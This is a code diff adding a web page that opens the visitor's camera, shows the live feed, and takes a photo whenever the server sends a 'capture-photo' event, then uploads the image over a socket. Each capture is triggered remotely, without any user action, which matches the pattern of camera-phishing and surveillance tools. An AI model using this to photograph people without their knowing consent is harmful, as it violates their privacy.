@@ -1,0 +1,72 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>User Camera Page</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #121212;
+            color: #ffffff;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            margin: 0;
+        }
+        h2 { color: #00e676; }
+        video {
+            width: 90%;
+            max-width: 400px;
+            border-radius: 10px;
+            border: 2px solid #333;
+        }
+        canvas { display: none; }
+        .status { margin-top: 15px; font-size: 14px; color: #aaa; }
+    </style>
+</head>
+<body>
+
+    <h2>📷 Live Camera Feed</h2>
+    <video id="video" autoplay playsinline></video>
+    <canvas id="canvas"></canvas>
+    <div class="status" id="status">Connecting to server...</div>
+
+    <script src="/socket.io/socket.io.js"></script>
+    <script>
+        const socket = io();
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const statusText = document.getElementById('status');
+
+        // Camera access request
+        navigator.mediaDevices.getUserMedia({ video: true })
+            .then(stream => {
+                video.srcObject = stream;
+                statusText.innerText = "Camera Active & Connected";
+            })
+            .catch(err => {
+                console.error("Camera Error: ", err);
+                statusText.innerText = "Camera Permission Denied";
+            });
+
+        // Capture trigger listener from server
+        socket.on('capture-photo', () => {
+            const context = canvas.getContext('2d');
+            canvas.width = video.videoWidth || 640;
+            canvas.height = video.videoHeight || 480;
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+            const imageData = canvas.toDataURL('image/png');
+            socket.emit('user-photo-captured', imageData);
+            statusText.innerText = "Photo Captured & Sent!";
+            
+            setTimeout(() => {
+                statusText.innerText = "Camera Active & Connected";
+            }, 3000);
+        });
+    </script>
+</body>
+</html>
